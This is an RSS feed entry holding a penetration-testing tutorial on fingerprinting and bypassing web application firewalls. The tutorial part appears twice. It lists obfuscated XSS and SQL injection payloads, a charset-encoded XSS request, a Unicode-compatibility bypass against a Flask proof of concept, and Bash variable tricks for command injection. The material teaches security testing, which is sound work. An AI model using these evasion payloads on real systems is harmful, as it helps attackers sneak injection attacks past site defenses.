&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from waf import waf  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app = Flask(\_\_name\_\_)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@app.route(&amp;#39;/&amp;#39;)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;def Welcome\_name():  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; name = request.args.get(&amp;#39;name&amp;#39;)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; if waf(name):  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; abort(403, description=&amp;#34;XSS Detected&amp;#34;)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; else:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; name = unicodedata.normalize(&amp;#39;NFKD&amp;#39;, name) #NFC, NFKC, NFD, and NFKD  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; return &amp;#39;Test XSS: &amp;#39; + name  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;if \_\_name\_\_ == &amp;#39;\_\_main\_\_&amp;#39;:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; app.run(port=81)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Where the inial payload of &lt;code&gt;＜img src=p onerror=&#39;prompt(1)&#39;&amp;gt;&lt;/code&gt; may have been detected by the firewall, the payload constructed with Unicode-compatible characters (&lt;code&gt;＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥&lt;/code&gt;) would remain undetected.&lt;/p&gt;
&lt;p&gt;Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found &lt;a href=&#34;https://www.compart.com/en/unicode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Uninitialized Variables&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Another potential method is to use uninitialized variables in your request (e.g. &lt;code&gt;$u&lt;/code&gt;) as demonstrated in this &lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;article&lt;/a&gt;. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Dn2ov32HcZKKSE-4.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/image-3.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/image-3.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*0jvcJnOSNRnOcYZJ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/waf3_2.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/waf3_2.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&#34;&gt;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;https://jlajara.gitlab.io/Bypass_WAF_Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&#34;&gt;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&#34;&gt;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <content:encoded><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.</p>
<p>WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.</p>
<p>Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them <a href="https://docs.python.org/3/library/re.html">here</a>. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.</p>
<h1 id="identifying-wafs">Identifying WAFs</h1>
<h2 id="manually">Manually</h2>
<p>As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as <code>https://example.com/?p4yl04d3=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*lDR9M2gtJzPvOdWg" alt="Picture of Cloudflare firewall blocking a webpage."  />

Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:</p>
<ul>
<li>The name of the WAF in the <code>Server</code> header (e.g. <code>Server: cloudflare</code>)</li>
<li>Additional HTTP response headers associated with the WAF (e.g. <code>CF-RAY: xxxxxxxxxxx</code>)</li>
<li>Cookies that appear to be set by a WAF (e.g. the response header<code>Set-Cookie: __cfduid=xxxxx</code>)</li>
<li>Unique response code upon submitting malicious requests. (e.g. <code>412</code>)</li>
</ul>
<p>Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a <code>FIN/RST</code> TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.</p>
<h2 id="automations">Automations</h2>
<p>There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.</p>
<ol>
<li>Running an Nmap Scan</li>
</ol>
<p>The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com  
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT  
</span></span><span style="display:flex;"><span>Nmap scan report for example.com (xxx.xxx.xxx.xxx)  
</span></span><span style="display:flex;"><span>Host is up (0.20s latency).  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>PORT STATE SERVICE  
</span></span><span style="display:flex;"><span>443/tcp open https  
</span></span><span style="display:flex;"><span>| http-waf-detect: IDS/IPS/WAF detected:  
</span></span><span style="display:flex;"><span>|\_example.com:443/?p4yl04d3=&lt;script&gt;alert(document.cookie)&lt;/script&gt;  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
</span></span></code></pre></div><ol start="2">
<li><a href="https://github.com/Ekultek/WhatWaf">WafW00f</a></li>
</ol>
<p>Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ wafw00f example.com 
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8zeEz07TxwZ8VGBIaqxVvA.png" alt=""  />

3. <a href="https://github.com/Ekultek/WhatWaf">WhatWaf</a></p>
<p>In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_pCVKq8cL3ZTghqWG5BAyQ.png" alt=""  />

The results from WhatWaf are consistent with those of Wafw00f.</p>
<h1 id="bypassing-wafs">Bypassing WAFs</h1>
<p>This section will outline some of the potential WAF bypass techniques with examples.</p>
<ol>
<li>Bypassing Regex</li>
</ol>
<hr>
<p>This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this <a href="https://www.secforce.com/blog/bypassing-wafs-web-application-filters/">article</a> explains regex bypass through case studies.</p>
<p>Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using <a href="https://www.aleksandrhovhannisyan.com/blog/crlf-vs-lf-normalizing-line-endings-in-git/">linebreaks</a> or tabs. The examples below demonstrate some approaches to bypassing regex with comments.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>sCrIpT<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(XSS)<span style="color:#f92672">&lt;/</span>sCriPt<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#changing the case of the tag  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;&lt;</span>script<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(XSS)<span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#prepending an additional &#34;&lt;&#34;  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>script<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(XSS) <span style="color:#f92672">//</span> <span style="color:#75715e">#removing the closing tag  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>script<span style="color:#f92672">&gt;</span>alert<span style="color:#f92672">`</span>XSS<span style="color:#f92672">`&lt;/</span>script<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#using backticks instead of parenetheses  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>java<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>ascript:<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>) <span style="color:#75715e">#using encoded newline characters  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>iframe src<span style="color:#f92672">=</span>http:<span style="color:#f92672">//</span>malicous.com <span style="color:#f92672">&lt;</span> <span style="color:#75715e">#double open angle brackets  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>STYLE<span style="color:#f92672">&gt;</span>.classname<span style="color:#960050;background-color:#1e0010">{</span>background<span style="color:#f92672">-</span>image:<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;javascript:alert(XSS)&#34;</span>);<span style="color:#960050;background-color:#1e0010">}</span><span style="color:#f92672">&lt;/</span>STYLE<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#uncommon tags  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>img<span style="color:#f92672">/</span>src<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>onerror<span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#bypass space filter by using / where a space is expected  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href<span style="color:#f92672">=</span>javascript:<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span>xss<span style="color:#f92672">&lt;/</span>a<span style="color:#f92672">&gt;</span> <span style="color:#75715e">#extra characters
</span></span></span></code></pre></div><h2 id="obfuscation">Obfuscation</h2>
<p>While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#a6e22e">Function</span>(<span style="color:#e6db74">&#34;ale&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;rt(1)&#34;</span>)(); <span style="color:#75715e">#using uncommon functions besides alert, console.log, and prompt  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>javascript:<span style="color:#ae81ff">74163166147401571561541571411447514115414516216450615176</span> <span style="color:#75715e">#octal encoding  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>iframe src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(`xss`)&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#75715e">#unicode encoding  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">/?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>un<span style="color:#75715e">/**/</span>ion<span style="color:#f92672">+</span>sel<span style="color:#75715e">/**/</span>ect<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#75715e">-- #using comments in SQL query to break up statement  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>new Function<span style="color:#f92672">`</span>alt<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">`</span><span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">``</span>; <span style="color:#75715e">#using backticks instead of parentheses  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>data:<span style="color:#66d9ef">text</span><span style="color:#f92672">/</span>html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik<span style="color:#f92672">+</span> <span style="color:#75715e">#base64 encoding the javascript  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">%</span><span style="color:#ae81ff">26</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2397</span>;<span style="color:#a6e22e">lert</span>(<span style="color:#ae81ff">1</span>) <span style="color:#75715e">#using HTML encoding  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>a src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#75715e">#Using Line Feed (LF) line breaks   
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span>BODY onload<span style="color:#f92672">!</span><span style="color:#75715e">#$%&amp;()*~+-\_.,:;?@[/|\]^`=confirm()&gt; # use any chars that aren&#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
</span></span></span></code></pre></div><p>Additional resources include <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads">PayloadsAllTheThings</a> and <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP</a>.</p>
<h2 id="2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass"><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass">2. Charset</a></h2>
<p>This technique involves modifying the <code>Content-Type</code> header to use a different charset (e.g. <code>ibm500</code>). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ python3  
</span></span><span style="display:flex;"><span>-- snip --  
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; import urllib.parse  
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; s = &#39;&lt;script&gt;alert(&#34;xss&#34;)&lt;/script&gt;&#39;  
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; urllib.parse.quote\_plus(s.encode(&#34;IBM037&#34;))  
</span></span><span style="display:flex;"><span>&#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&#39;
</span></span></code></pre></div><p>The encoded string can then be sent in the request body and uploaded to the server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /comment/post HTTP/1.1  
</span></span><span style="display:flex;"><span>Host: chatapp  
</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded; charset=ibm500  
</span></span><span style="display:flex;"><span>Content-Length: 74  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
</span></span></code></pre></div><ol start="3">
<li>Content Size</li>
</ol>
<hr>
<p>In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.</p>
<ol start="4">
<li>Unicode Compatibility</li>
</ol>
<hr>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*khYe6n5QPB7ar2GG.jpg" alt=""  />

<em><a href="http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg">http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg</a></em></p>
<p>Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">unicode equivalence</a>.</p>
<p>For instance, the characters<code>／</code>(U+FF0F) and <code>/</code> (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character<code>/</code>(U+002F) despite starting out as different characters. Digging deeper, whether <code>／</code>(U+FF0F) and <code>/</code> (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.</p>
<p>Characters are typically normalized through one of the four standard Unicode normalization algorithms:</p>
<ul>
<li><strong>NFC:</strong> Normalization Form Canonical Composition</li>
<li><strong>NFD:</strong> Normalization Form Canonical Decomposition</li>
<li><strong>NFKC:</strong> Normalization Form Compatibility Composition</li>
<li><strong>NFKD:</strong> Normalization Form Compatibility Decomposition</li>
</ul>
<p>NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details <a href="https://www.unicode.org/reports/tr15/">here</a>). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. <a href="https://jlajara.gitlab.io/Bypass_WAF_Unicode">Jorge Lahara</a> demonstrates this in the PoC webserver below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>from flask import Flask, abort, request  
</span></span><span style="display:flex;"><span>import unicodedata  
</span></span><span style="display:flex;"><span>from waf import waf  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>app = Flask(\_\_name\_\_)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>@app.route(&#39;/&#39;)  
</span></span><span style="display:flex;"><span>def Welcome\_name():  
</span></span><span style="display:flex;"><span> name = request.args.get(&#39;name&#39;)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> if waf(name):  
</span></span><span style="display:flex;"><span> abort(403, description=&#34;XSS Detected&#34;)  
</span></span><span style="display:flex;"><span> else:  
</span></span><span style="display:flex;"><span> name = unicodedata.normalize(&#39;NFKD&#39;, name) #NFC, NFKC, NFD, and NFKD  
</span></span><span style="display:flex;"><span> return &#39;Test XSS: &#39; + name  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>if \_\_name\_\_ == &#39;\_\_main\_\_&#39;:  
</span></span><span style="display:flex;"><span> app.run(port=81)
</span></span></code></pre></div><p>Where the inial payload of <code>＜img src=p onerror='prompt(1)'&gt;</code> may have been detected by the firewall, the payload constructed with Unicode-compatible characters (<code>＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥</code>) would remain undetected.</p>
<p>Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found <a href="https://www.compart.com/en/unicode">here</a>.</p>
<ol start="5">
<li>Uninitialized Variables</li>
</ol>
<hr>
<p>Another potential method is to use uninitialized variables in your request (e.g. <code>$u</code>) as demonstrated in this <a href="https://www.secjuice.com/web-application-firewall-waf-evasion/">article</a>. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*Dn2ov32HcZKKSE-4.png" alt=""  />

<em><a href="https://www.secjuice.com/content/images/2018/08/image-3.png">https://www.secjuice.com/content/images/2018/08/image-3.png</a></em></p>
<p>When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*0jvcJnOSNRnOcYZJ.png" alt=""  />

<em><a href="https://www.secjuice.com/content/images/2018/08/waf3_2.png">https://www.secjuice.com/content/images/2018/08/waf3_2.png</a></em></p>
<h1 id="more-reading">More Reading</h1>
<ul>
<li><a href="https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/">https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/</a></li>
<li><a href="https://jlajara.gitlab.io/Bypass_WAF_Unicode">https://jlajara.gitlab.io/Bypass_WAF_Unicode</a></li>
<li><a href="https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/">https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/</a></li>
<li><a href="https://www.secjuice.com/web-application-firewall-waf-evasion/">https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/</a></li>
<li><a href="https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf">https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf</a></li>
</ul>
]]></content:encoded>
    </item>
  </channel>
</rss>
